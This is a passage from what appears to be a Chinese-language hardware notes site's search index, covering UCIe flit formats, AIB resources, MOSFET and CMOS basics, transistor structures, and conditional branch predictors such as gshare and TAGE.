<p>\u200b\u65e0\u8bba\u200b\u54ea\u200b\u79cd\u200b\u683c\u5f0f\u200b\uff0c\u200b\u6700\u540e\u200b\u5230\u200b\u7269\u7406\u5c42\u200b\u90fd\u200b\u662f\u200b\u4ee5\u200b 64B \u200b\u4e3a\u200b\u4e00\u7ec4\u200b\u7684\u200b\u5f62\u5f0f\u200b\u53d1\u9001\u200b\u51fa\u53bb\u200b\u3002</p> <p>\u200b\u7efc\u5408\u200b\u4ee5\u4e0a\u200b\u9700\u6c42\u200b\uff0cUCIe \u200b\u4e00\u5171\u200b\u652f\u6301\u200b\u5982\u4e0b\u200b\u7684\u200b\u683c\u5f0f\u200b\uff1a</p> <ol> <li>Format 1: Raw <code>Protocol Layer populates all the bytes on FDI. Adapter passes to RDI without modifications or additions.</code> \u200b\u5bf9\u200b\u6570\u636e\u200b\u4e0d\u200b\u505a\u200b\u4efb\u4f55\u200b\u5904\u7406\u200b\uff0c\u200b\u76f4\u63a5\u200b\u4f20\u7ed9\u200b\u7269\u7406\u5c42\u200b</li> <li>Format 2: 68B Flit <code>Protocol Layer transmits 64B per Flit on FDI. Adapter inserts two bytes of Flit header and two bytes of CRC and performs the required barrel shifting of bytes before transmitting on RDI. On the RX, Adapter strips out the Flit header and CRC only sending the 64B per Flit to the Protocol Layer on FDI.</code> \u200b\u5728\u200b 64B \u200b\u7684\u200b Flit \u200b\u524d\u9762\u200b\u63d2\u5165\u200b\u4e24\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5934\u90e8\u200b\uff0c\u200b\u5728\u200b\u540e\u9762\u200b\u63d2\u5165\u200b\u4e24\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u4ee5\u200b 68B \u200b\u4e3a\u200b\u5355\u4f4d\u200b\uff0c\u200b\u8fde\u7eed\u200b\u5730\u200b\u653e\u5728\u200b\u591a\u4e2a\u200b 64B \u200b\u4e2d\u200b\u53d1\u9001\u200b\u51fa\u53bb\u200b</li> <li>Format 3: Standard 256B End Header Flit <code>Protocol Layer transmits 256B of Flit on FDI, while driving 0b on the bits reserved for the Adapter. Adapter fills in the relevant Flit header and CRC information before transmitting on RDI. On the Rx, Adapter forwards the Flit received from the Link to the Protocol Layer without modifying any bits applicable to the Protocol Layer, and the Protocol Layer must ignore any bits not applicable for it. Flit Header is located on Byte 236 and Byte 237 of the Flit.</code> \u200b\u5728\u200b Flit \u200b\u5c3e\u90e8\u200b\u63d2\u5165\u200b\u5934\u90e8\u200b\u7b49\u200b\u4fe1\u606f\u200b</li> <li>Format 4: Standard 256B Start Header Flit <code>Protocol Layer transmits 256B of Flit on FDI, while driving 0b on the bits reserved for the Adapter. Adapter fills in the relevant Flit header and CRC information before transmitting on RDI. On the Rx, Adapter forwards the Flit received from the Link to the Protocol Layer without modifying any bits applicable to the Protocol Layer, and the Protocol Layer must ignore any bits not applicable for it. Flit Header is located on Byte 0 and Byte 1 of the Flit.</code> \u200b\u5728\u200b Flit \u200b\u5934\u90e8\u200b\u63d2\u5165\u200b\u4e24\u200b\u5b57\u8282\u200b\u7684\u200b\u5934\u90e8\u200b\uff0c\u200b\u5728\u200b\u5c3e\u90e8\u200b\u63d2\u5165\u200b\u5176\u4f59\u200b\u4fe1\u606f\u200b</li> <li>Format 5: Latency-Optimized 256B without Optional Bytes Flit <code>Protocol Layer transmits 256B of Flit on FDI, while driving 0b on the bits reserved for the Adapter. Adapter fills in the relevant Flit header and CRC information before transmitting on RDI. On the Rx, Adapter forwards the Flit received from the Link to the Protocol Layer without modifying any bits applicable to the Protocol Layer, and the Protocol Layer must ignore any bits not applicable for it. CRC bytes sent with each 128B of the Flit. The optional Protocol Layer bytes are reserved in this format and not used by the Protocol Layer.</code> \u200b\u5728\u200b\u6570\u636e\u200b\u7684\u200b\u4e2d\u95f4\u200b\u548c\u200b\u5c3e\u90e8\u200b\u90fd\u200b\u63d2\u5165\u200b\u8f83\u200b\u77ed\u200b\u7684\u200b CRC\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\u66f4\u200b\u77ed\u200b\u7684\u200b\u5ef6\u8fdf\u200b</li> <li>Format 6: Latency-Optimized 256B with Optional Bytes Flit <code>Protocol Layer transmits 256B of Flit on FDI, while driving 0b on the bits reserved for the Adapter. Adapter fills in the relevant Flit header and CRC information before transmitting on RDI. On the Rx, Adapter forwards the Flit received from the Link to the Protocol Layer without modifying any bits applicable to the Protocol Layer, and the Protocol Layer must ignore any bits not applicable for it. CRC bytes sent with each 128B of the Flit, and optional bytes are used by the Protocol Layer.</code></li> </ol> <p>\u200b\u4e0a\u6587\u200b\u7684\u200b FDI \u200b\u610f\u601d\u200b\u662f\u200b Flit-aware D2D Interface\uff0c\u200b\u662f\u200b Protocol Layer \u200b\u548c\u200b D2D Adapter \u200b\u4e4b\u95f4\u200b\u7684\u200b\u63a5\u53e3\u200b\uff1bRDi \u200b\u7684\u200b\u610f\u601d\u200b\u662f\u200b Raw D2D Interface\uff0c\u200b\u662f\u200b D2D Adapter \u200b\u548c\u200b Physical Layer \u200b\u4e4b\u95f4\u200b\u7684\u200b\u63a5\u53e3\u200b\u3002</p>"},{"location":"hardware/chiplet.html#physical-layer","title":"Physical Layer","text":"<p>\u200b\u7269\u7406\u5c42\u200b\u62ff\u5230\u200b\u7684\u200b\u5c31\u662f\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b 64B \u200b\u6570\u636e\u200b\uff0c\u200b\u6839\u636e\u200b\u94fe\u8def\u200b\u7684\u200b\u5bbd\u5ea6\u200b\uff0c\u200b\u5206\u5e03\u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b Lane \u200b\u4e0a\u200b\u3002</p>"},{"location":"hardware/chiplet.html#aib-advanced-interface-bus","title":"AIB (Advanced Interface Bus)","text":"<p>Specification: https://github.com/chipsalliance/AIB-specification</p> <p>Whitepaper: https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/accelerating-innovation-through-aib-whitepaper.pdf</p> <p>RTL Example: https://github.com/chipsalliance/aib-protocols https://github.com/chipsalliance/aib-phy-hardware</p>"},{"location":"hardware/cmos.html","title":"CMOS (Complementary Metal Oxide Semiconductor)","text":""},{"location":"hardware/cmos.html#mosfet","title":"MOSFET","text":"<p>MOSFET \u200b\u6709\u200b\u4e24\u79cd\u200b\uff1aNMOS \u200b\u548c\u200b PMOS\uff0c\u200b\u7535\u8def\u200b\u7b26\u53f7\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> PMOS \u200b\u548c\u200b NMOS \u200b\u7684\u200b\u7535\u8def\u200b\u7b26\u53f7\u200b\uff08\u200b\u56fe\u6e90\u200b Wikipedia\uff09 <p>PMOS \u200b\u548c\u200b NMOS \u200b\u90fd\u200b\u6709\u200b\u4e09\u4e2a\u200b\u7535\u6781\u200b\uff0c\u200b\u5206\u522b\u200b\u662f\u200b\u6e90\u7ea7\u200b\uff08Source\uff09\uff0c\u200b\u6805\u7ea7\u200b\uff08Gate\uff09\u200b\u548c\u200b\u6f0f\u7ea7\u200b\uff08Drain\uff09\u3002MOSFET \u200b\u7684\u200b\u7279\u70b9\u200b\u662f\u200b\uff0c\u200b\u5728\u200b \\(D\\) \u200b\u5230\u200b \\(S\\) \u200b\u7684\u200b\u7535\u6d41\u200b\u53d7\u5230\u200b \\(G\\) \u200b\u4e5f\u200b\u5c31\u662f\u200b\u6805\u7ea7\u200b\u7684\u200b\u7535\u538b\u200b\u7684\u200b\u63a7\u5236\u200b\uff1a</p> <ol> <li>\u200b\u5f53\u200b \\(V_{GS} &lt; V_{th}\\) \u200b\u65f6\u200b\uff0c\\(I_D=0\\)\uff0c\u200b\u6b64\u65f6\u200b MOSFET \u200b\u5904\u4e8e\u200b\u65ad\u5f00\u200b\u7684\u200b\u72b6\u6001\u200b</li> <li>\u200b\u5f53\u200b \\(V_{GS} &gt; V_{th}, V_{GD} &gt; V_{th}\\) \u200b\u65f6\u200b\uff0c\\(I_D=\\frac{1}{2}\\mu_nC_{ox}\\frac{W}{L}(2(V_{GS}-V_{th})V_{DS}-V_{DS}^2)\\)\uff0c\u200b\u6b64\u65f6\u200b MOSFET \u200b\u5904\u4e8e\u200b\u7ebf\u6027\u200b\u533a\u200b</li> <li>\u200b\u5f53\u200b \\(V_{GS} &gt; V_{th}, V_{GD} &lt; V_{th}\\) \u200b\u65f6\u200b\uff0c\\(I_D=\\frac{1}{2}\\mu_nC_{ox}\\frac{W}{L}(V_{GS}-V_{th})^2[1+\\lambda(V_{DS}-V_{DSsat})]\\)\uff0c\u200b\u6b64\u65f6\u200b MOSFET \u200b\u5904\u4e8e\u200b\u9971\u548c\u200b\u533a\u200b</li> </ol> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b\u7ebf\u6027\u200b\u533a\u200b\u548c\u200b\u9971\u548c\u200b\u533a\u200b\u662f\u200b\u5728\u200b \\(I_D - V_{DS}\\) \u200b\u7279\u6027\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\u8bf4\u200b\u7684\u200b\uff08\u200b\u89c1\u200b\u4e0b\u56fe\u200b\uff09\uff0c\u200b\u610f\u601d\u200b\u662f\u200b\u5f53\u200b \\(V_{GS} &gt; V_{th}\\) \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u968f\u7740\u200b \\(V_{DS}\\) \u200b\u7684\u200b\u589e\u5927\u200b\uff0c\\(I_D\\) \u200b\u9996\u5148\u200b\u4f1a\u200b\u589e\u5927\u200b\uff0c\u200b\u76f4\u5230\u200b \\(V_{GD} &gt; V_{th}\\) \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\\(I_D\\) \u200b\u9971\u548c\u200b\uff0c\u200b\u51e0\u4e4e\u200b\u4e0d\u518d\u200b\u589e\u52a0\u200b\u3002\u200b\u4e25\u683c\u200b\u6765\u8bb2\u200b\uff0c\u200b\u6240\u8c13\u200b\u7684\u200b\u7ebf\u6027\u200b\u533a\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u4e5f\u200b\u4e0d\u662f\u200b\u76f4\u7ebf\u200b\uff0c\u200b\u800c\u662f\u200b\u629b\u7269\u7ebf\u200b\u3002</p> <p> </p>  I<sub>D</sub> - V<sub>DS</sub> \u200b\u7279\u5f81\u200b\u66f2\u7ebf\u200b\uff08\u200b\u56fe\u6e90\u200b\u6e05\u534e\u5927\u5b66\u200b\u5f20\u96f7\u200b\u8001\u5e08\u200b\u7535\u5b50\u5b66\u200b\u57fa\u7840\u200b\u8bfe\u7a0b\u200b\u7684\u200b\u8bfe\u4ef6\u200b\uff09 <p>PMOS \u200b\u548c\u200b NMOS \u200b\u7684\u200b\u533a\u522b\u200b\u662f\u200b\u7535\u6d41\u200b\u7684\u200b\u65b9\u5411\u4e0d\u540c\u200b\u3002PMOS \u200b\u7535\u6d41\u200b\u4ece\u200b S \u200b\u6d41\u5411\u200b D\uff0cNMOS \u200b\u7535\u6d41\u200b\u4ece\u200b D \u200b\u548c\u200b S\u3002\u200b\u5982\u679c\u200b\u6ce8\u610f\u200b\u5230\u200b\u4e0a\u9762\u200b MOSFET \u200b\u7684\u200b\u7b26\u53f7\u200b\u7684\u200b\u753b\u6cd5\u200b\uff0c\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u7535\u6d41\u200b\u90fd\u200b\u662f\u4ece\u200b\u4e0a\u9762\u200b\u5f80\u4e0b\u6d41\u200b\u3002\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u89c4\u5f8b\u200b\uff0c\u200b\u7bad\u5934\u200b\u8fde\u63a5\u200b\u7684\u200b\u90a3\u200b\u4e00\u4fa7\u200b\u5c31\u662f\u200b S\u3002</p>"},{"location":"hardware/cmos.html#cmos","title":"\u6570\u5b57\u7535\u8def\u200b\u4e2d\u200b\u7684\u200b CMOS","text":"<p>CMOS \u200b\u5168\u79f0\u200b\u662f\u200b Complementary metal\u2013oxide\u2013semiconductor\uff0c\u200b\u610f\u601d\u200b\u5c31\u662f\u200b\u62ff\u200b PMOS \u200b\u548c\u200b NMOS \u200b\u7684\u200b\u7ec4\u5408\u200b\u6765\u200b\u5b9e\u73b0\u200b\u7535\u8def\u200b\u3002\u200b\u5f53\u200b CMOS \u200b\u88ab\u200b\u7528\u6765\u200b\u5b9e\u73b0\u200b\u6570\u5b57\u7535\u8def\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cPMOS \u200b\u548c\u200b NMOS \u200b\u7ecf\u5e38\u200b\u6210\u200b\u5bf9\u200b\u51fa\u73b0\u200b\uff0cPMOS \u200b\u63a5\u5230\u200b \\(V_{DD}\\)\uff0cNMOS \u200b\u63a5\u5230\u200b \\(GND\\) \u200b\u4e0a\u200b\u3002\u200b\u4f8b\u5982\u200b\u7528\u200b PMOS \u200b\u548c\u200b NMOS \u200b\u5b9e\u73b0\u200b\u4e00\u4e2a\u200b\u975e\u200b\u95e8\u200b\uff08NOT gate\uff09\uff1a</p> <p> </p>  CMOS \u200b\u5b9e\u73b0\u200b\u975e\u200b\u95e8\u200b\uff08\u200b\u56fe\u6e90\u200b CMOS Logic Gate - Geeks for Geeks\uff09 <p>\u200b\u5f53\u200b\u8f93\u5165\u200b\u4e3a\u200b\u9ad8\u7535\u5e73\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cNMOS \u200b\u5bfc\u901a\u200b\uff0cPMOS \u200b\u65ad\u5f00\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8f93\u51fa\u200b\u901a\u8fc7\u200b NMOS \u200b\u63a5\u5230\u200b\u4e86\u200b\u5730\u4e0a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8f93\u51fa\u200b\u4f4e\u7535\u5e73\u200b\u3002\u200b\u5f53\u200b\u8f93\u5165\u200b\u4e3a\u200b\u4f4e\u7535\u5e73\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cPMOS \u200b\u5bfc\u901a\u200b\uff0cNMOS \u200b\u65ad\u5f00\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8f93\u51fa\u200b\u901a\u8fc7\u200b PMOS \u200b\u63a5\u5230\u200b\u4e86\u200b\u7535\u6e90\u200b\u4e0a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8f93\u51fa\u200b\u9ad8\u7535\u5e73\u200b\u3002\u200b\u7528\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u8bbe\u8ba1\u200b\u51fa\u200b\u4e0e\u975e\u95e8\u200b\uff08NAND gate\uff09\u200b\u548c\u200b\u6216\u975e\u95e8\u200b\uff08NOR gate\uff09\uff1a</p> <p> </p>  CMOS \u200b\u5b9e\u73b0\u200b\u4e0e\u975e\u95e8\u200b\u548c\u200b\u6216\u975e\u95e8\u200b\uff08\u200b\u56fe\u6e90\u200b CMOS Logic Gate - Geeks for Geeks\uff09 <p>\u200b\u4ee5\u53ca\u200b\u5728\u200b\u5de5\u827a\u200b\u5e93\u91cc\u200b\u5e38\u89c1\u200b\u7684\u200b AOI\uff08And Or Invert\uff09\u200b\u548c\u200b OAI\uff08Or And Invert\uff09\u200b\u95e8\u200b\uff1a</p> <p> </p>  CMOS \u200b\u5b9e\u73b0\u200b AOI \u200b\u548c\u200b OAI \u200b\u95e8\u200b\uff08\u200b\u56fe\u6e90\u200b CMOS Logic Gate - Geeks for Geeks\uff09 <p>CMOS \u200b\u5728\u200b\u5b9e\u73b0\u200b\u6570\u5b57\u7535\u8def\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5e76\u200b\u6ca1\u6709\u200b\u7528\u5230\u200b\u5b83\u200b\u7684\u200b\u7ebf\u6027\u200b\u533a\u200b\u548c\u200b\u9971\u548c\u200b\u533a\u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u53ea\u7528\u200b\u5230\u200b\u4e86\u200b \\(V_{GS}\\) \u200b\u548c\u200b \\(V_{th}\\) \u200b\u7684\u200b\u5927\u5c0f\u200b\u4ee5\u53ca\u200b\u662f\u5426\u200b\u6709\u200b\u7535\u6d41\u200b\u7684\u200b\u5173\u7cfb\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b PMOS \u200b\u548c\u200b NMOS \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u7528\u200b\u7535\u538b\u200b\u63a7\u5236\u200b\u7684\u200b\u5f00\u5173\u200b\u3002</p>"},{"location":"hardware/cmos.html#planar-fet-finfet-gaafet-and-mbcfet","title":"Planar FET, FinFET, GAAFET and MBCFET","text":"<p>\u200b\u4e0b\u9762\u200b\u6765\u200b\u8ba8\u8bba\u4e00\u4e0b\u200b CMOS \u200b\u7535\u8def\u200b\u7684\u200b\u5de5\u827a\u200b\u3002\u200b\u524d\u9762\u200b\u8bb2\u200b\u5230\u200b\uff0cCMOS \u200b\u6709\u200b\u4e09\u4e2a\u200b\u6e90\u200b\uff08S\uff09\uff0c\u200b\u6805\u200b\uff08G\uff09\u200b\u548c\u200b\u6f0f\u200b\uff08D\uff09\uff0c\u200b\u5f53\u200b G \u200b\u65bd\u52a0\u200b\u8db3\u591f\u200b\u9ad8\u200b\u7684\u200b\u7535\u538b\u200b\u65f6\u200b\uff0cS \u200b\u548c\u200b D \u200b\u4e4b\u95f4\u200b\u53ef\u4ee5\u200b\u6709\u200b\u7535\u6d41\u200b\u901a\u8fc7\u200b\u3002\u200b\u4ece\u200b\u7269\u7406\u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u200b\u4e09\u4e2a\u200b\u7535\u7ea7\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u5c31\u200b\u51b3\u5b9a\u200b\u4e86\u200b\u5b83\u200b\u751f\u4ea7\u200b\u7684\u200b\u96be\u5ea6\u200b\u4ee5\u53ca\u200b\u80fd\u591f\u200b\u5b9e\u73b0\u200b\u7684\u200b\u6676\u4f53\u7ba1\u200b\u5bc6\u5ea6\u200b\uff1a</p> <p> </p>  \u200b\u4e0d\u540c\u200b\u7684\u200b FET \u200b\u7269\u7406\u200b\u6784\u9020\u200b 3D \u200b\u793a\u610f\u56fe\u200b\uff08\u200b\u56fe\u6e90\u200b Samsung\uff09 <p> </p>  \u200b\u4e0d\u540c\u200b\u7684\u200b FET \u200b\u7269\u7406\u200b\u6784\u9020\u200b 2D \u200b\u5207\u9762\u200b\u56fe\u200b\uff08\u200b\u56fe\u6e90\u200b On the Vertically Stacked Gate-All-Around Nanosheet and Nanowire Transistor Scaling beyond the 5 nm Technology Node\uff09 <ol> <li>Planar FET\uff1a\u200b\u524d\u540e\u200b\u662f\u200b S \u200b\u548c\u200b D\uff0c\u200b\u7136\u540e\u200b G \u200b\u76d6\u200b\u5728\u200b\u4e0a\u9762\u200b\uff0c\u200b\u5f53\u200b G \u200b\u65bd\u52a0\u200b\u7535\u538b\u200b\u65f6\u200b\uff0c\u200b\u5728\u200b G \u200b\u4e0b\u90e8\u200b\u3001S \u200b\u548c\u200b D \u200b\u4e4b\u95f4\u200b\u805a\u96c6\u200b\u7535\u5b50\u200b\uff0c\u200b\u5f62\u6210\u200b\u7535\u6d41\u200b\u3002</li> <li>FinFET\uff1a\u200b\u524d\u540e\u200b\u662f\u200b S \u200b\u548c\u200b D\uff0cG \u200b\u4ece\u200b\u4e0a\u65b9\u200b\u3001\u200b\u5de6\u4fa7\u200b\u548c\u200b\u53f3\u4fa7\u200b\u6765\u200b\u5939\u4f4f\u200b S \u200b\u548c\u200b D \u200b\u4e4b\u95f4\u200b\u7684\u200b\u901a\u9053\u200b\uff0c\u200b\u4e09\u9762\u200b\u73af\u7ed5\u200b\u3002</li> <li>GAAFET(Nanowire)/MBCFET(Nanosheet)\uff1a\u200b\u524d\u540e\u200b\u4e09\u6761\u200b\u662f\u200b S \u200b\u548c\u200b D\uff0cG \u200b\u4ece\u200b\u56db\u4e2a\u200b\u65b9\u5411\u200b\u5939\u4f4f\u200b\u4e09\u5bf9\u200b S \u200b\u548c\u200b D \u200b\u4e4b\u95f4\u200b\u7684\u200b\u901a\u9053\u200b\uff0c\u200b\u56db\u9762\u200b\u73af\u7ed5\u200b\u3002</li> </ol> <p>\u200b\u968f\u7740\u200b\u5236\u7a0b\u200b\u53d1\u5c55\u200b\uff0cG \u200b\u548c\u200b S-D \u200b\u4e4b\u95f4\u200b\u901a\u9053\u200b\u7684\u200b\u63a5\u89e6\u9762\u200b\u8d8a\u6765\u8d8a\u200b\u591a\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u6676\u4f53\u7ba1\u200b\u5bc6\u5ea6\u200b\uff0c\u200b\u751f\u4ea7\u5de5\u827a\u200b\u4e5f\u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html","title":"\u6761\u4ef6\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668","text":"<p>\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u8d1f\u8d23\u200b\u9884\u6d4b\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u7684\u200b\u8df3\u8f6c\u200b\u65b9\u5411\u200b\uff1a\u200b\u8df3\u8f6c\u200b\uff08Taken\uff09\u200b\u6216\u8005\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\uff08Not Taken\uff09\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html#static-predictor","title":"Static predictor","text":"<p>\u200b\u53ea\u200b\u6839\u636e\u200b\u6307\u4ee4\u200b\u672c\u8eab\u200b\u7684\u200b\u7c7b\u578b\u200b\uff08\u200b\u6216\u8005\u200b hint\uff09\u200b\u8fdb\u884c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html#bimodal-predictor","title":"Bimodal predictor","text":"<p>\u200b\u5bf9\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u6c42\u200b hash\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b hash \u200b\u53d6\u6a21\u200b\u4f5c\u4e3a\u200b index \u200b\u53bb\u200b\u8bbf\u95ee\u200b\u4e00\u4e2a\u200b\u8868\u200b\uff0c\u200b\u8868\u200b\u7684\u200b\u6bcf\u4e00\u9879\u200b\u662f\u200b\u4e00\u4e2a\u200b 2-bit saturating counter\uff0c0 \u200b\u548c\u200b 1 \u200b\u9884\u6d4b\u200b not taken\uff0c2 \u200b\u548c\u200b 3 \u200b\u9884\u6d4b\u200b taken\u3002\u200b\u6267\u884c\u200b\u5b8c\u200b\u5206\u652f\u200b\u540e\u200b\uff0c\u200b\u5982\u679c\u200b taken\uff0c\u200b\u5219\u200b\u5bf9\u5e94\u200b counter \u200b\u52a0\u4e00\u200b\uff1b\u200b\u5426\u5219\u200b\u5bf9\u5e94\u200b counter \u200b\u51cf\u4e00\u200b\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html#two-level-predictor","title":"Two level predictor","text":"<p>\u200b\u8bb0\u5f55\u200b\u6700\u8fd1\u200b\u82e5\u5e72\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\u5386\u53f2\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5728\u200b Global History Register \u200b\u91cc\u9762\u200b\uff0c\u200b\u518d\u7528\u200b GHR \u200b\u4f5c\u4e3a\u200b index \u200b\u53bb\u200b\u8bbf\u95ee\u200b Pattern History Table\uff0cPHT \u200b\u7684\u200b\u6bcf\u4e00\u9879\u200b\u4e5f\u200b\u662f\u200b\u4e00\u4e2a\u200b 2 bit saturating counter\uff0c\u200b\u5269\u4e0b\u200b\u7684\u200b\u903b\u8f91\u200b\u548c\u200b Bimodal \u200b\u4e00\u6837\u200b\u3002\u200b\u6709\u65f6\u5019\u200b GHR \u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b Direction History Register(DHR)\u3002</p> <p>\u200b\u5982\u679c\u200b\u628a\u200b PC \u200b\u548c\u200b GHR \u200b\u5f02\u6216\u200b\u540e\u200b\u4f5c\u4e3a\u200b index \u200b\u8bbf\u95ee\u200b PHT\uff0c\u200b\u5c31\u662f\u200b Gshare \u200b\u7b97\u6cd5\u200b\u3002\u200b\u5982\u679c\u200b\u628a\u200b PC \u200b\u548c\u200b GHR \u200b\u62fc\u63a5\u200b\u8d77\u6765\u200b\u4f5c\u4e3a\u200b index \u200b\u8bbf\u95ee\u200b PHT\uff0c\u200b\u5c31\u662f\u200b Gselect \u200b\u7b97\u6cd5\u200b\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html#local-history","title":"Local History","text":"<p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8bb0\u5f55\u200b\u6bcf\u4e2a\u200b\u5206\u652f\u200b\u81ea\u5df1\u200b\u7684\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\u5386\u53f2\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5728\u200b Branch History Table \u200b\u91cc\u9762\u200b\uff1a\u200b\u6839\u636e\u200b PC \u200b\u4ece\u200b Branch History Table \u200b\u91cc\u200b\u627e\u5230\u200b\u8be5\u200b\u5206\u652f\u200b\u7684\u200b Local History\uff0c\u200b\u518d\u7528\u200b Local History \u200b\u8bbf\u95ee\u200b PHT\u3002\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u628a\u200b Local History \u200b\u548c\u200b PC \u200b\u7ed3\u5408\u200b\u8d77\u6765\u200b\u4f5c\u4e3a\u200b index \u200b\u8bbf\u95ee\u200b PHT\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html#path-history","title":"Path History","text":"<p>\u200b\u9664\u4e86\u200b\u8bb0\u5f55\u200b\u6240\u6709\u200b\u5206\u652f\u200b\u7684\u200b Taken/Not Taken \u200b\u5386\u53f2\u200b\u5230\u200b GHR \u200b\u91cc\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u53ea\u200b\u8bb0\u5f55\u200b Taken \u200b\u5206\u652f\u200b\u7684\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u4ee5\u53ca\u200b\u5206\u652f\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5230\u200b Path History Register \u200b\u91cc\u200b\uff0c\u200b\u4ee3\u66ff\u200b GHR \u200b\u7684\u200b\u4f5c\u7528\u200b\u3002Intel \u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b\u8fd9\u4e2a\u200b\u65b9\u6848\u200b\uff0c\u200b\u6bcf\u4e2a\u200b Taken \u200b\u5206\u652f\u200b\u751f\u6210\u200b\u82e5\u5e72\u4f4d\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u5f02\u6216\u200b\u5230\u200b PHR \u200b\u5de6\u79fb\u200b\u82e5\u5e72\u4f4d\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u6210\u4e3a\u200b\u65b0\u200b\u7684\u200b PHR\uff0c\u200b\u6bd4\u8f83\u200b\u65b0\u200b\u7684\u200b Intel \u200b\u5904\u7406\u5668\u200b\u7684\u200b PHR \u200b\u53ef\u4ee5\u200b\u6700\u200b\u591a\u200b\u8bb0\u5f55\u200b 194 \u200b\u4e2a\u200b Taken \u200b\u5206\u652f\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002</p>"},{"location":"hardware/conditional_branch_predictor.html#tage","title":"TAGE","text":"<p>TAGE \u200b\u662f\u200b\u6d41\u884c\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\uff0c\u200b\u7531\u200b\u4e00\u4e2a\u200b base predictor \u200b\u4ee5\u53ca\u200b\u82e5\u5e72\u4e2a\u200b PHT \u200b\u7ec4\u6210\u200b\u3002\u200b\u4e0d\u540c\u200b\u7684\u200b PHT \u200b\u91c7\u7528\u200b\u4e86\u200b\u4e0d\u540c\u200b\u7684\u200b GHR/PHR \u200b\u4f4d\u6570\u200b\uff0c\u200b\u4f4d\u6570\u200b\u5448\u200b\u51e0\u4f55\u7ea7\u6570\u200b\u3002\u200b\u9884\u6d4b\u200b\u65f6\u200b\uff0cbase predictor \u200b\u548c\u200b\u6240\u6709\u200b PHT \u200b\u540c\u65f6\u200b\u9884\u6d4b\u200b\uff0c\u200b\u6700\u540e\u200b\u91c7\u7528\u200b\u7ed9\u51fa\u200b\u9884\u6d4b\u200b\u91cc\u200b\u91c7\u7528\u200b\u7684\u200b\u5386\u53f2\u200b\u4f4d\u200b\u6570\u6700\u591a\u200b\u7684\u200b\u90a3\u200b\u4e00\u4e2a\u200b\u3002</p> <p>PHT \u200b\u7684\u200b\u6bcf\u4e2a\u200b\u9879\u200b\u8bb0\u5f55\u200b\u4e86\u200b\uff1a</p> <ol> <li>prediction saturating counter\uff1a\u200b\u7528\u6765\u200b\u9884\u6d4b\u200b taken/not taken</li> <li>useful saturating counter\uff1a\u200b\u8868\u793a\u200b\u8be5\u200b\u8868\u9879\u200b\u7684\u200b\u91cd\u8981\u6027\u200b</li> <li>tag\uff1a\u200b\u51fa\u73b0\u200b index \u200b\u51b2\u7a81\u200b\u65f6\u200b\u5224\u65ad\u200b\u9884\u6d4b\u200b\u7684\u200b\u662f\u5426\u662f\u200b\u6b63\u786e\u200b\u7684\u200b\u5206\u652f\u200b</li> </ol> <p>useful \u200b\u7684\u200b\u7ef4\u62a4\u200b\u65b9\u6cd5\u200b\uff1a</p> <ol> 